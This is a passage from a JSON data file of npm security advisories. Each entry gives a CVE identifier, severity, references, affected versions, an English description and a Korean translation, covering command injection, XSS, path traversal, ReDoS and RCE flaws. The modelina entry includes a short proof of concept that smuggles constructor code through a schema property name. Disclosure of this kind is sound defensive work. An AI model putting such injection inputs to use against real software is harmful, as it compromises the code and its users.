    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25853\nhttps://security.snyk.io/vuln/SNYK-JS-SEMVERTAGS-3175612\nhttps://github.com/jtrussell/semver-tags/blob/db1ba680bafed0d51e1bb36bd38f2c5439fe8b00/lib/get-tags.js#L21\nhttps://github.com/jtrussell/semver-tags/blob/db1ba680bafed0d51e1bb36bd38f2c5439fe8b00/lib/get-tags.js%23L21\nhttps://github.com/advisories/GHSA-8h3g-hcwp-6hxq",
    "name": "semver-tags",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.4.10",
    "descriptionKR": "패키지 semver-tags의 모든 버전은 부적절한 입력 삭제로 인해 getGitTagsRemote 기능을 통한 명령 주입에 취약합니다."
  },
  {
    "description": "Bootstrap-3-Typeahead after version 4.0.2 is vulnerable to a cross-site scripting flaw in the highlighter() function. An attacker could exploit this via user interaction to execute code in the user's browser. This issue was introduced in commit `dbd1af5bf` and has not been fixed.",
    "identifiers": "GHSA : GHSA-m2hm-hrr2-6p2q\nCVE : CVE-2019-10215",
    "severity": "MODERATE",
    "updatedAt": "2023-02-03T00:18:23Z",
    "publishedAt": "2022-05-24T22:00:56Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2019-10215\nhttps://access.redhat.com/errata/RHSA-2019:3771\nhttps://github.com/bassjobsen/Bootstrap-3-Typeahead\nhttp://lists.opensuse.org/opensuse-security-announce/2020-07/msg00083.html\nhttps://github.com/bassjobsen/Bootstrap-3-Typeahead/commit/dbd1af5bfb14592213e3d88f1fa8f726b93f8a1e\nhttps://access.redhat.com/security/cve/CVE-2019-10215\nhttps://bugzilla.redhat.com/show_bug.cgi?id=1735506\nhttps://github.com/advisories/GHSA-m2hm-hrr2-6p2q",
    "name": "bootstrap-3-typeahead",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "> 4.0.2",
    "descriptionKR": "버전 4.0.2 이후의 Bootstrap-3-Typeahead는 highlighter() 함수의 교차 사이트 스크립팅 결함에 취약합니다. 공격자는 사용자 상호 작용을 통해 이를 악용하여 사용자의 브라우저에서 코드를 실행할 수 있습니다. 이 문제는 커밋 `dbd1af5bf`에서 소개되었으며 아직 수정되지 않았습니다."
  },
  {
    "description": "All versions of the package is-http2 are vulnerable to Command Injection due to missing input sanitization or other checks, and sandboxes being employed to the isH2 function.",
    "identifiers": "GHSA : GHSA-2275-rpf5-xv8h\nCVE : CVE-2022-25906",
    "severity": "HIGH",
    "updatedAt": "2023-08-08T22:00:24Z",
    "publishedAt": "2023-02-01T06:30:30Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25906\nhttps://security.snyk.io/vuln/SNYK-JS-ISHTTP2-3153878\nhttps://github.com/stefanjudis/is-http2/blob/master/index.js#L23\nhttps://github.com/stefanjudis/is-http2/blob/master/index.js%23L23\nhttps://github.com/advisories/GHSA-2275-rpf5-xv8h",
    "name": "is-http2",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.2.0",
    "descriptionKR": "패키지 is-http2의 모든 버전은 누락된 입력 삭제 또는 기타 검사 및 isH2 기능에 사용되는 샌드박스로 인해 명령 주입에 취약합니다."
  },
  {
    "description": "A vulnerability has been found in youngerheart nodeserver and classified as critical. Affected by this vulnerability is an unknown functionality of the file nodeserver.js. The manipulation leads to path traversal. The name of the patch is c4c0f0138ab5afbac58e03915d446680421bde28. It is recommended to apply a patch to fix this issue. The identifier VDB-218461 was assigned to this vulnerability.",
    "identifiers": "GHSA : GHSA-3fwq-qv5v-2wxf\nCVE : CVE-2020-36651",
    "severity": "HIGH",
    "updatedAt": "2023-02-02T05:06:19Z",
    "publishedAt": "2023-01-18T03:31:17Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-36651\nhttps://github.com/youngerheart/nodeserver/pull/6\nhttps://github.com/youngerheart/nodeserver/commit/c4c0f0138ab5afbac58e03915d446680421bde28\nhttps://vuldb.com/?ctiid.218461\nhttps://vuldb.com/?id.218461\nhttps://github.com/advisories/GHSA-3fwq-qv5v-2wxf",
    "name": "web-node-server",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.0.11",
    "identifier": "0.0.11",
    "descriptionKR": "youngheart nodeserver에서 취약성이 발견되어 위험으로 분류되었습니다. 이 취약점의 영향을 받는 것은 nodeserver.js 파일의 알려지지 않은 기능입니다. 조작은 경로 통과로 이어집니다. 패치의 이름은 c4c0f0138ab5afbac58e03915d446680421bde28입니다. 이 문제를 해결하려면 패치를 적용하는 것이 좋습니다. 식별자 VDB-218461이 이 취약점에 할당되었습니다."
  },
  {
    "description": "### Impact\nUnsanitized input flows into Strategy match operation (EXIST), where it is used to build a regular expression. This may result in a Regular expression Denial of Service attack (reDOS).\n\n### Patches\nPatched in 3.1.4\n\n### Workarounds\nAvoid using Strategy settings that use REGEX in conjunction with EXIST and NOT_EXIST operations.",
    "identifiers": "GHSA : GHSA-wqxw-8h5g-hq56\nCVE : CVE-2023-23925",
    "severity": "HIGH",
    "updatedAt": "2023-04-21T19:35:45Z",
    "publishedAt": "2023-02-02T01:33:06Z",
    "references": "https://github.com/switcherapi/switcher-client-master/security/advisories/GHSA-wqxw-8h5g-hq56\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-23925\nhttps://github.com/switcherapi/switcher-client-master/releases/tag/v3.1.4\nhttps://github.com/switcherapi/switcher-client-master/commit/374752563d6ce9353ee592b40c809c8136f24930\nhttps://github.com/advisories/GHSA-wqxw-8h5g-hq56",
    "name": "switcher-client",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.1.4",
    "identifier": "3.1.4",
    "descriptionKR": "### 영향\n정제되지 않은 입력은 전략 일치 작업(EXIST)으로 흘러 들어가 정규식을 작성하는 데 사용됩니다. 이로 인해 reDOS(Regular expression Denial of Service) 공격이 발생할 수 있습니다.\n\n### 패치\n3.1.4에서 패치됨\n\n### 해결 방법\nEXIST 및 NOT_EXIST 작업과 함께 REGEX를 사용하는 전략 설정을 사용하지 마십시오."
  },
  {
    "description": "http-cache semantics contains an Inefficient Regular Expression Complexity , leading to Denial of Service. This affects versions of the package http-cache-semantics before 4.1.1. The issue can be exploited via malicious request header values sent to a server, when that server reads the cache policy from the request using this library.",
    "identifiers": "GHSA : GHSA-rc47-6667-2j5j\nCVE : CVE-2022-25881",
    "severity": "HIGH",
    "updatedAt": "2023-06-22T17:26:15Z",
    "publishedAt": "2023-01-31T06:30:26Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25881\nhttps://github.com/kornelski/http-cache-semantics/blob/master/index.js%23L83\nhttps://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-3253332\nhttps://security.snyk.io/vuln/SNYK-JS-HTTPCACHESEMANTICS-3248783\nhttps://github.com/kornelski/http-cache-semantics/commit/560b2d8ef452bbba20ffed69dc155d63ac757b74\nhttps://security.netapp.com/advisory/ntap-20230622-0008/\nhttps://github.com/advisories/GHSA-rc47-6667-2j5j",
    "name": "http-cache-semantics",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.1.1",
    "identifier": "4.1.1",
    "descriptionKR": "http-cache 의미론에는 서비스 거부로 이어지는 비효율적인 정규식 복잡성이 포함되어 있습니다. 이는 4.1.1 이전의 패키지 http-cache-semantics 버전에 영향을 미칩니다. 이 문제는 서버가 이 라이브러리를 사용하여 요청에서 캐시 정책을 읽을 때 서버로 전송되는 악의적인 요청 헤더 값을 통해 악용될 수 있습니다."
  },
  {
    "description": "Versions of the package nemo-appium before 0.0.9 are vulnerable to Command Injection due to improper input sanitization in the 'module.exports.setup' function. \n\n**Note:** In order to exploit this vulnerability appium-running 0.1.3 has to be installed as one of nemo-appium dependencies.",
    "identifiers": "GHSA : GHSA-c6rx-gxqv-vr5j\nCVE : CVE-2022-21129",
    "severity": "CRITICAL",
    "updatedAt": "2023-02-07T21:14:51Z",
    "publishedAt": "2023-01-31T06:30:26Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-21129\nhttps://github.com/paypal/nemo-appium/commit/aa271d36dd5c81baae3c43aa2616c84f0ee4195f\nhttps://github.com/paypal/nemo-appium/blob/master/index.js%23L27\nhttps://security.snyk.io/vuln/SNYK-JS-NEMOAPPIUM-3183747\nhttps://github.com/advisories/GHSA-c6rx-gxqv-vr5j",
    "name": "nemo-appium",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.0.9",
    "identifier": "0.0.9",
    "descriptionKR": "패키지 nemo-appium 0.0.9 이전 버전은 'module.exports.setup' 기능의 부적절한 입력 삭제로 인해 명령 주입에 취약합니다.\n\n**참고:** 이 취약점을 악용하려면 appium-running 0.1.3이 nemo-appium 종속성 중 하나로 설치되어야 합니다."
  },
  {
    "description": "Versions of the package jsuites before 5.0.1 are vulnerable to Cross-site Scripting (XSS) due to improper user-input sanitization in the Editor() function.",
    "identifiers": "GHSA : GHSA-r4hg-4cpq-q57c\nCVE : CVE-2022-25979",
    "severity": "MODERATE",
    "updatedAt": "2023-02-15T05:07:27Z",
    "publishedAt": "2023-01-31T06:30:26Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25979\nhttps://github.com/jsuites/jsuites/issues/134\nhttps://github.com/jsuites/jsuites/commit/b31770d5fe91684a00177f629aab933139c32d9f\nhttps://security.snyk.io/vuln/SNYK-JS-JSUITES-3226764\nhttps://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-3253331\nhttps://github.com/advisories/GHSA-r4hg-4cpq-q57c",
    "name": "jsuites",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 5.0.1",
    "identifier": "5.0.1",
    "descriptionKR": "5.0.1 이전의 패키지 jsuites 버전은 Editor() 함수의 부적절한 사용자 입력 삭제로 인해 XSS(교차 사이트 스크립팅)에 취약합니다."
  },
  {
    "description": "loadAsync in JSZip before 3.8.0 allows Directory Traversal via a crafted ZIP archive.",
    "identifiers": "GHSA : GHSA-36fh-84j7-cv5h\nCVE : CVE-2022-48285",
    "severity": "HIGH",
    "updatedAt": "2023-03-03T23:25:11Z",
    "publishedAt": "2023-01-29T06:30:52Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-48285\nhttps://github.com/Stuk/jszip/commit/2edab366119c9ee948357c02f1206c28566cdf15\nhttps://github.com/Stuk/jszip/compare/v3.7.1...v3.8.0\nhttps://www.mend.io/vulnerability-database/WS-2023-0004\nhttps://exchange.xforce.ibmcloud.com/vulnerabilities/244499\nhttps://github.com/advisories/GHSA-36fh-84j7-cv5h",
    "name": "jszip",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.8.0",
    "identifier": "3.8.0",
    "descriptionKR": "3.8.0 이전의 JSZip에 있는 loadAsync는 제작된 ZIP 아카이브를 통한 디렉터리 순회를 허용합니다."
  },
  {
    "description": "Versions of the package servst before 2.0.3 are vulnerable to Directory Traversal due to improper sanitization of the filePath variable.",
    "identifiers": "GHSA : GHSA-88v8-v46g-6c9w\nCVE : CVE-2022-25936",
    "severity": "HIGH",
    "updatedAt": "2023-02-15T05:06:31Z",
    "publishedAt": "2023-01-30T06:30:27Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25936\nhttps://github.com/andrepolischuk/servst/commit/f7cae5d2d7c64c86bc512e1e50614240396ef114\nhttps://gist.github.com/lirantal/691d02d607753d54856f9335f9a1692f\nhttps://security.snyk.io/vuln/SNYK-JS-SERVST-3244896\nhttps://github.com/advisories/GHSA-88v8-v46g-6c9w",
    "name": "servst",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.0.3",
    "identifier": "2.0.3",
    "descriptionKR": "2.0.3 이전 버전의 servst 패키지는 filePath 변수의 부적절한 삭제로 인해 디렉터리 탐색에 취약합니다."
  },
  {
    "description": "Versions of the package eta before 2.0.0 are vulnerable to Remote Code Execution (RCE) by overwriting template engine configuration variables with view options received from The Express render API. **Note:** This is exploitable only for users who are rendering templates with user-defined data.",
    "identifiers": "GHSA : GHSA-mf6x-hrgr-658f\nCVE : CVE-2022-25967",
    "severity": "HIGH",
    "updatedAt": "2023-02-07T23:18:24Z",
    "publishedAt": "2023-01-30T06:30:27Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25967\nhttps://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd\nhttps://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/compile-string.ts%23L21\nhttps://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/file-handlers.ts%23L182\nhttps://security.snyk.io/vuln/SNYK-JS-ETA-2936803\nhttps://github.com/advisories/GHSA-mf6x-hrgr-658f",
    "name": "eta",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.0.0",
    "identifier": "2.0.0",
    "descriptionKR": "2.0.0 이전의 패키지 eta 버전은 The Express render API에서 받은 보기 옵션으로 템플릿 엔진 구성 변수를 덮어써 RCE(Remote Code Execution)에 취약합니다. **참고:** 이것은 사용자 정의 데이터로 템플릿을 렌더링하는 사용자에게만 악용될 수 있습니다."
  },
  {
    "description": "### Impact\nXSS attack - anyone using the Express API is impacted\n\n### Patches\nThe problem has been resolved. Users should upgrade to version 2.0.0.\n\n### Workarounds\nDon't pass user supplied data directly to `res.renderFile`. \n\n### References\n_Are there any links users can visit to find out more?_\nSee https://github.com/eta-dev/eta/releases/tag/v2.0.0",
    "identifiers": "GHSA : GHSA-xrh7-m5pp-39r6\nCVE : CVE-2023-23630",
    "severity": "HIGH",
    "updatedAt": "2023-02-08T22:37:39Z",
    "publishedAt": "2023-01-31T22:39:40Z",
    "references": "https://github.com/eta-dev/eta/security/advisories/GHSA-xrh7-m5pp-39r6\nhttps://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-23630\nhttps://github.com/eta-dev/eta/releases/tag/v2.0.0\nhttps://github.com/advisories/GHSA-xrh7-m5pp-39r6",
    "name": "eta",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.0.0",
    "identifier": "2.0.0",
    "descriptionKR": "### 영향\nXSS 공격 - Express API를 사용하는 모든 사용자가 영향을 받음\n\n### 패치\n문제가 해결되었습니다. 사용자는 버전 2.0.0으로 업그레이드해야 합니다.\n\n### 해결 방법\n사용자가 제공한 데이터를 `res.renderFile`에 직접 전달하지 마세요.\n\n### 참조\n_사용자가 자세히 알아보기 위해 방문할 수 있는 링크가 있습니까?_\nhttps://github.com/eta-dev/eta/releases/tag/v2.0.0 참조"
  },
  {
    "description": "### Impact\n\nParse Server uses the request header `x-forwarded-for` to determine the client IP address. If Parse Server doesn't run behind a proxy server, then a client can set this header and Parse Server will trust the value of the header. The incorrect client IP address will be used by various features in Parse Server. This allows to circumvent the security mechanism of the Parse Server option `masterKeyIps` by setting an allowed IP address as the `x-forwarded-for` header value.\n\n### Patches\n\nThe mechanism to determine the client IP address has been rewritten. The correct IP address determination now requires to set the Parse Server option `trustProxy` accordingly, see the express framework's [trust proxy](https://expressjs.com/en/guide/behind-proxies.html) setting.\n\n### References\n- https://github.com/parse-community/parse-server/security/advisories/GHSA-vm5r-c87r-pf6x\n- https://expressjs.com/en/guide/behind-proxies.html",
    "identifiers": "GHSA : GHSA-vm5r-c87r-pf6x\nCVE : CVE-2023-22474",
    "severity": "HIGH",
    "updatedAt": "2023-02-04T00:14:08Z",
    "publishedAt": "2023-01-31T22:21:48Z",
    "references": "https://github.com/parse-community/parse-server/security/advisories/GHSA-vm5r-c87r-pf6x\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-22474\nhttps://github.com/parse-community/parse-server/commit/e016d813e083ce6828f9abce245d15b681a224d8\nhttps://github.com/advisories/GHSA-vm5r-c87r-pf6x",
    "name": "parse-server",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 5.4.1",
    "identifier": "5.4.1",
    "descriptionKR": "### 영향\n\nParse Server는 요청 헤더 `x-forwarded-for`를 사용하여 클라이언트 IP 주소를 결정합니다. Parse Server가 프록시 서버 뒤에서 실행되지 않는 경우 클라이언트는 이 헤더를 설정할 수 있으며 Parse Server는 헤더 값을 신뢰합니다. 잘못된 클라이언트 IP 주소는 Parse Server의 다양한 기능에서 사용됩니다. 이를 통해 허용된 IP 주소를 `x-forwarded-for` 헤더 값으로 설정하여 Parse Server 옵션 `masterKeyIps`의 보안 메커니즘을 우회할 수 있습니다.\n\n### 패치\n\n클라이언트 IP 주소를 결정하는 메커니즘이 재작성되었습니다. 이제 올바른 IP 주소를 결정하려면 그에 따라 Parse Server 옵션 'trustProxy'를 설정해야 합니다. 익스프레스 프레임워크의 [신뢰 프록시](https://expressjs.com/en/guide/behind-proxies.html) 설정을 참조하세요.\n\n### 참조\n- https://github.com/parse-community/parse-server/security/advisories/GHSA-vm5r-c87r-pf6x\n- https://expressjs.com/en/guide/behind-proxies.html"
  },
  {
    "description": "TaffyDB allows attackers to forge adding additional properties into user-input processed by taffy which can allow access to any data items in the DB. Taffy sets an internal index for each data item in its DB. However, it is found that the internal index can be forged by adding additional properties into user-input. If index is found in the query, TaffyDB will ignore other query conditions and directly return the indexed data item. Moreover, the internal index is in an easily-guessable format (e.g., T000002R000001). As such, attackers can use this vulnerability to access any data items in the DB. **Note:** `taffy` and its successor package `taffydb` are not maintained.",
    "identifiers": "GHSA : GHSA-mxhp-79qh-mcx6\nCVE : CVE-2019-10790",
    "severity": "HIGH",
    "updatedAt": "2023-01-30T19:22:18Z",
    "publishedAt": "2020-02-19T16:43:42Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2019-10790\nhttps://snyk.io/vuln/SNYK-JS-TAFFY-546521\nhttps://www.npmjs.com/package/taffy\nhttps://github.com/advisories/GHSA-mxhp-79qh-mcx6",
    "name": "taffydb",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 2.7.3",
    "descriptionKR": "TaffyDB는 공격자가 DB의 모든 데이터 항목에 대한 액세스를 허용할 수 있는 taffy가 처리하는 사용자 입력에 추가 속성을 위조할 수 있도록 합니다. Taffy는 자신의 DB에 각 데이터 항목에 대한 내부 인덱스를 설정합니다. 그러나 사용자 입력에 추가 속성을 추가하여 내부 인덱스를 위조할 수 있음을 알 수 있습니다. 쿼리에서 인덱스가 발견되면 TaffyDB는 다른 쿼리 조건을 무시하고 인덱싱된 데이터 항목을 직접 반환합니다. 또한 내부 인덱스는 쉽게 추측할 수 있는 형식(예: T000002R000001)입니다. 따라서 공격자는 이 취약점을 사용하여 DB의 모든 데이터 항목에 액세스할 수 있습니다. **참고:** `taffy` 및 후속 패키지인 `taffydb`는 유지되지 않습니다."
  },
  {
    "description": "All versions of the package serve-lite are vulnerable to Directory Traversal due to missing input sanitization or other checks and protections employed to the req.url passed as-is to path.join().",
    "identifiers": "GHSA : GHSA-5qq4-m6c3-xxmf\nCVE : CVE-2022-21192",
    "severity": "HIGH",
    "updatedAt": "2023-01-30T18:17:38Z",
    "publishedAt": "2023-01-26T21:30:28Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-21192\nhttps://gist.github.com/lirantal/9ccdfda0edcb95e36d07a04b0b6c2db0\nhttps://security.snyk.io/vuln/SNYK-JS-SERVELITE-3149916\nhttps://github.com/advisories/GHSA-5qq4-m6c3-xxmf",
    "name": "serve-lite",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.1.0",
    "descriptionKR": "패키지 serve-lite의 모든 버전은 누락된 입력 삭제 또는 path.join()에 있는 그대로 전달된 req.url에 사용된 기타 검사 및 보호 기능으로 인해 디렉터리 탐색에 취약합니다."
  },
  {
    "description": "All versions of the package serve-lite are vulnerable to Cross-site Scripting (XSS) because when it detects a request to a directory, it renders a file listing of all of its contents with links that include the actual file names without any sanitization or output encoding.",
    "identifiers": "GHSA : GHSA-j8x7-qcw4-xx85\nCVE : CVE-2022-25847",
    "severity": "MODERATE",
    "updatedAt": "2023-01-30T18:17:38Z",
    "publishedAt": "2023-01-26T21:30:25Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25847\nhttps://gist.github.com/lirantal/52debd25284726fcc2eaed9c7512975c\nhttps://security.snyk.io/vuln/SNYK-JS-SERVELITE-3149915\nhttps://github.com/advisories/GHSA-j8x7-qcw4-xx85",
    "name": "serve-lite",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.1.0",
    "descriptionKR": "serve-lite 패키지의 모든 버전은 XSS(교차 사이트 스크립팅)에 취약합니다. 디렉터리에 대한 요청을 감지하면 실제 파일 이름이 포함된 링크가 포함된 모든 내용의 파일 목록을 삭제 또는 삭제하지 않고 렌더링하기 때문입니다. 출력 인코딩."
  },
  {
    "description": "An issue was discovered in Electerm 1.3.22, allows attackers to execute arbitrary code via unverified request to electerms service.",
    "identifiers": "GHSA : GHSA-x73w-g8hx-v7rp\nCVE : CVE-2020-23256",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-28T01:18:12Z",
    "publishedAt": "2023-01-20T21:30:32Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-23256\nhttps://github.com/electerm/electerm/issues/1686\nhttps://github.com/advisories/GHSA-x73w-g8hx-v7rp",
    "name": "electerm",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.3.22",
    "descriptionKR": "Electterm 1.3.22에서 문제가 발견되어 공격자가 electterms 서비스에 대한 확인되지 않은 요청을 통해 임의 코드를 실행할 수 있습니다."
  },
  {
    "description": "All versions of the package vagrant.js are vulnerable to Command Injection via the boxAdd function due to improper input sanitization.",
    "identifiers": "GHSA : GHSA-54jw-jqr9-6cj9\nCVE : CVE-2022-25962",
    "severity": "CRITICAL",
    "updatedAt": "2023-02-03T20:29:11Z",
    "publishedAt": "2023-01-26T21:30:25Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25962\nhttps://security.snyk.io/vuln/SNYK-JS-VAGRANTJS-3175614\nhttps://github.com/advisories/GHSA-54jw-jqr9-6cj9",
    "name": "vagrant.js",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.0.4",
    "descriptionKR": "vagrant.js 패키지의 모든 버전은 부적절한 입력 삭제로 인해 boxAdd 기능을 통한 명령 주입에 취약합니다."
  },
  {
    "description": "All versions of the package create-choo-electron are vulnerable to Command Injection via the devInstall function due to improper user-input sanitization.",
    "identifiers": "GHSA : GHSA-j8wr-fwf2-vvr9\nCVE : CVE-2022-25908",
    "severity": "CRITICAL",
    "updatedAt": "2023-02-03T20:29:30Z",
    "publishedAt": "2023-01-26T21:30:25Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25908\nhttps://security.snyk.io/vuln/SNYK-JS-CREATECHOOELECTRON-3157953\nhttps://github.com/advisories/GHSA-j8wr-fwf2-vvr9",
    "name": "create-choo-electron",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 2.0.0",
    "descriptionKR": "패키지 create-choo-electron의 모든 버전은 부적절한 사용자 입력 삭제로 인해 devInstall 기능을 통한 명령 주입에 취약합니다."
  },
  {
    "description": "Cross Site Scripting (XSS) vulnerability in yapi 1.9.1 allows attackers to execute arbitrary code via the /interface/api edit page.",
    "identifiers": "GHSA : GHSA-4jqw-vfmj-9rmh\nCVE : CVE-2021-36686",
    "severity": "MODERATE",
    "updatedAt": "2023-03-01T05:06:26Z",
    "publishedAt": "2023-01-26T21:30:29Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-36686\nhttps://github.com/YMFE/yapi/issues/2190\nhttps://github.com/YMFE/yapi/issues/2240\nhttps://github.com/advisories/GHSA-4jqw-vfmj-9rmh",
    "name": "yapi-vendor",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.9.1",
    "descriptionKR": "yapi 1.9.1의 XSS(Cross Site Scripting) 취약점으로 인해 공격자는 /interface/api 편집 페이지를 통해 임의의 코드를 실행할 수 있습니다."
  },
  {
    "description": "All versions of the package smartctl are vulnerable to Command Injection via the info method due to improper input sanitization.",
    "identifiers": "GHSA : GHSA-69f2-4375-qv9h\nCVE : CVE-2022-21810",
    "severity": "HIGH",
    "updatedAt": "2023-02-02T10:31:55Z",
    "publishedAt": "2023-01-26T21:30:27Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-21810\nhttps://security.snyk.io/vuln/SNYK-JS-SMARTCTL-3175613\nhttps://github.com/baslr/node-smartctl/blob/f61266084d5b3e4baae9bd85f67ec4ec6a716736/index.js#23L18\nhttps://github.com/baslr/node-smartctl/blob/f61266084d5b3e4baae9bd85f67ec4ec6a716736/index.js%23L18\nhttps://github.com/advisories/GHSA-69f2-4375-qv9h",
    "name": "smartctl",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.0.0",
    "descriptionKR": "패키지 smartctl의 모든 버전은 부적절한 입력 삭제로 인해 info 메서드를 통한 명령 주입에 취약합니다."
  },
  {
    "description": "Versions of the package simple-git before 3.16.0 are vulnerable to Remote Code Execution (RCE) via the clone(), pull(), push() and listRemote() methods, due to improper input sanitization. This vulnerability exists due to an incomplete fix of CVE-2022-25912.",
    "identifiers": "GHSA : GHSA-9w5j-4mwv-2wj8\nCVE : CVE-2022-25860",
    "severity": "CRITICAL",
    "updatedAt": "2023-02-03T20:33:16Z",
    "publishedAt": "2023-01-26T21:30:25Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25860\nhttps://github.com/steveukx/git-js/pull/881/commits/95459310e5b8f96e20bb77ef1a6559036b779e13\nhttps://github.com/steveukx/git-js/commit/ec97a39ab60b89e870c5170121cd9c1603cc1951\nhttps://security.snyk.io/vuln/SNYK-JS-SIMPLEGIT-3177391\nhttps://github.com/advisories/GHSA-9w5j-4mwv-2wj8",
    "name": "simple-git",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.16.0",
    "identifier": "3.16.0",
    "descriptionKR": "3.16.0 이전의 simple-git 패키지 버전은 부적절한 입력 삭제로 인해 clone(), pull(), push() 및 listRemote() 메서드를 통한 원격 코드 실행(RCE)에 취약합니다. 이 취약점은 CVE-2022-25912의 불완전한 수정으로 인해 존재합니다."
  },
  {
    "description": "All versions of the package puppet-facter are vulnerable to Command Injection via the getFact function due to improper input sanitization.",
    "identifiers": "GHSA : GHSA-g5qr-xgg7-8q2w\nCVE : CVE-2022-25350",
    "severity": "HIGH",
    "updatedAt": "2023-02-02T10:31:20Z",
    "publishedAt": "2023-01-26T21:30:25Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25350\nhttps://security.snyk.io/vuln/SNYK-JS-PUPPETFACTER-3175616\nhttps://github.com/olindata/node-puppet-facter/blob/f34bcc754325d71bb3b1b534804e53d6170f15f5/index.js#23L10\nhttps://github.com/olindata/node-puppet-facter/blob/f34bcc754325d71bb3b1b534804e53d6170f15f5/index.js%23L10\nhttps://github.com/advisories/GHSA-g5qr-xgg7-8q2w",
    "name": "puppet-facter",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.0.2",
    "descriptionKR": "패키지 puppet-facter의 모든 버전은 부적절한 입력 삭제로 인해 getFact 함수를 통한 명령 주입에 취약합니다."
  },
  {
    "description": "### Impact\nAnyone who is using the default presets and/or does not handle the functionality themself.\n\n### Patches\nIt is impossible to fully guard against this, because users have access to the original raw information. However, as of version 1, if you only access the constrained models, you will not encounter this issue.\n\nFurther similar situations are NOT seen as a security issue, but intended behavior.\n\n### Workarounds\nFully custom presets that change the entire rendering process which can then escape the user input.\n\n### For more information\nEven though that I changed all the presets here, the vulnerability is still present throughout. I am using a JSON Schema here for simplicity.\n```ts\nconst jsonSchemaDoc = {\n  $id: 'CustomClass',\n  type: 'object',\n  properties: {\n      'property: any; \\n constructor(){console.log(\"injected\")} \\n private _temp': { type: 'string' },\n  }\n};\ngenerator = new TypeScriptGenerator(\n  { \n    presets: [\n      {\n        class: {\n            property({ propertyName, content }) {\n              return `private ${propertyName}: any;`;\n            },\n            ctor() {\n              return '';\n            },\n            getter() {\n              return '';\n            },\n            setter() {\n              return '';\n            }\n        }\n      }\n    ]\n  }\n);\nconst inputModel = await generator.process(jsonSchemaDoc);\n```\nThis would render\n```ts\nexport class CustomClass {\n  private property: any; \n   constructor(){console.log(\"injected\")} \n   private _temp: any;\n  private additionalProperties: any;\n}\n```",
    "identifiers": "GHSA : GHSA-4jg2-84c2-pj95\nCVE : CVE-2023-23619",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-26T21:57:37Z",
    "publishedAt": "2021-09-21T18:41:59Z",
    "references": "https://github.com/asyncapi/modelina/security/advisories/GHSA-4jg2-84c2-pj95\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-23619\nhttps://github.com/advisories/GHSA-4jg2-84c2-pj95",
    "name": "@asyncapi/modelina",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.0.0",
    "identifier": "1.0.0",
